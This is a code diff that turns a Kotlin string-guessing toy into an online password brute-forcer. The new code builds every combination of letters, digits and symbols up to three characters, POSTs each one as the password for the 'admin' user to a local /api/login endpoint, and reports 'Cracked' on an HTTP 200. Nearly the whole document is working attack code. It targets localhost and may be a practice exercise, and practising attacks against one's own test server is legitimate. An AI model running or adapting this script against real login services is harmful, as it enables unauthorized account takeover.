@@ -1,31 +1,39 @@
-import kotlin.system.measureTimeMillis
-
-// Test
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.IOException
 
 fun main() {
-    val hiddenWord = "o*s03"
     val characterSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"
 
     var found = false
-    var length = 2  // Start with length 1
+    var length = 1  // Start with length 1
+    val limit = 4
 
-    val elapsedTime = measureTimeMillis {
-        while (!found) {
-            val current = CharArray(length)
-            found = generateCombinations(characterSet.toCharArray(), current, hiddenWord, 0)
-            if (found) {
-                println("Cracked: ${String(current)}")
-            }
-            length++
+    val startTime = System.currentTimeMillis()
+
+    while (!found) {
+        val current = CharArray(length)
+        found = generateCombinations(characterSet.toCharArray(), current, 0)
+        if (found) {
+            println("Cracked: ${String(current)}")
+        }
+        length++
+        if (length == limit) {
+            println("noob")
+            break
         }
     }
 
+    val elapsedTime = System.currentTimeMillis() - startTime
     println("Elapsed time: $elapsedTime ms")
 }
 
-fun generateCombinations(set: CharArray, current: CharArray, hiddenWord: String, position: Int): Boolean {
+fun generateCombinations(set: CharArray, current: CharArray, position: Int): Boolean {
+
     if (position == current.size) {
-        return current.contentEquals(hiddenWord.toCharArray())
+        val statusCode = apiCall(String(current))
+        return statusCode == 200
     }
 
     for (char in set) {
@@ -36,3 +44,34 @@ fun generateCombinations(set: CharArray, current: CharArray, hiddenWord: String,
     }
     return false
 }
+
+fun apiCall(password: String): Int {
+    val json = """
+    {
+        "username": "admin",
+        "password": "$password"
+    }
+"""
+
+    val client = OkHttpClient()
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val requestBody = json.toRequestBody(mediaType)
+
+    val request = Request.Builder()
+        .url("http://localhost:8080/api/login")
+        .post(requestBody)
+        .build()
+
+    var statusCode: Int = -1
+    try {
+        val response = client.newCall(request).execute()
+        statusCode = response.code
+    } catch (e: IOException) {
+        println(e)
+    }
+
+    return statusCode
+}
+
+
+
